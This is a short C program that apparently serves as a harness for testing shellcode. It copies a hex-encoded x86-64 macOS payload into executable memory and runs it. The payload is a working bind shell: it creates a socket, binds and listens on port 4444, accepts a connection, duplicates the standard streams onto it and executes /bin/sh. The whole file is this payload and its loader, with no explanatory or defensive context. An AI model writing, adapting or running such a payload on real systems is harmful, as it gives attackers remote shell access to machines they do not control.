#include <stdio.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>


const uint8_t code[] = "\xc6\x45\xf1\x02\x66\xc7\x45\xf2\x11\x5c\x31\xc0\x89\x45\xf4\x31\xd2\x89\xd6\x89\xd7\x40\xb6\x01\x40\xb7\x02\x31\xc0\xb0\x02\xc1\xe0\x18\x83\xc8\x61\x0f\x05\x89\x45\xec\x31\xd2\xb2\x10\x48\x8d\x75\xf0\x8b\x7d\xec\x31\xc0\xb0\x02\xc1\xe0\x18\x83\xc8\x68\x0f\x05\x31\xf6\x8b\x7d\xec\x31\xc0\xb0\x02\xc1\xe0\x18\x83\xc8\x6a\x0f\x05\x31\xd2\x31\xf6\x89\x75\xe4\x8b\x7d\xec\x31\xc0\xb0\x02\xc1\xe0\x18\x83\xc8\x1e\x0f\x05\x31\xf6\x89\xc7\x31\xc0\xb0\x02\xc1\xe0\x18\x83\xc8\x5a\x0f\x05\x40\xfe\xc6\x40\x80\xfe\x03\x7c\xeb\x31\xc0\x89\x45\xe0\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x89\x45\xd8\x31\xd2\x31\xf6\x48\x8d\x7d\xd8\x31\xc0\xb0\x02\xc1\xe0\x18\x83\xc8\x3b\x0f\x05";
  
int main(void) {

  // printf("sizeof(code) = %lu\n", sizeof(code));
  printf("Shellcode length = %lu\n", sizeof(code) - 1UL);

  void *addr = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, 
                    MAP_ANON|MAP_PRIVATE, -1, 0);
  if (addr == MAP_FAILED) {
    return 1;
  }

  memcpy(addr, code, sizeof(code));
  mprotect(addr, 0x1000, PROT_READ|PROT_EXEC);

  ((void(*)(void))addr)();

  return 2;
}


